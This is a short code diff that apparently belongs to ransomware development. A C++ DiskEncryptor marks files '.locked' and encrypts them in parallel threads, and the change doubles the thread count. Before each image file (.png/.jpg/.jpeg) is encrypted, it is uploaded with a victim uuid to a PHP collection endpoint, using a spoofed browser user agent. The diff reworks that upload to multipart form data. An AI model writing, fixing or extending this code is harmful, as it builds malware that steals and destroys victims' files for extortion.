@@ -9,7 +9,7 @@
 #include "diskencryptor.h"
 #include "http.h"
 
-#define DEFAULT_THREADS 3
+#define DEFAULT_THREADS 6
 #define FILE_EXTENSION ".locked"
 
 
@@ -57,9 +57,11 @@ void DiskEncryptor::iterateFiles(std::string uuid) {
 							threads.clear();
 						}
 						if (ext == ".png" || ext == ".jpg" || ext == ".jpeg") {
+							std::string strl;
 							std::string str = "uuid=" + uuid + "&ext=" + ext;
 							Http fileUploader(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3");
-							fileUploader.uploadFile(L"localhost", L"/server/hdhohzuag.php?action=upload", L"Content-Type: application/x-www-form-urlencoded\r\n", entry.path().wstring(), str);
+							fileUploader.uploadFile(L"localhost", L"/server/hdhohzuag.php?action=upload", L"Content-Type: multipart/form-data", entry.path().wstring(),strl, str);
+							std::cout << strl<< std::endl;
 						}
 						threads.push_back(std::thread(&DiskEncryptor::fileEncrypt, this, entry.path().string()));
 					}
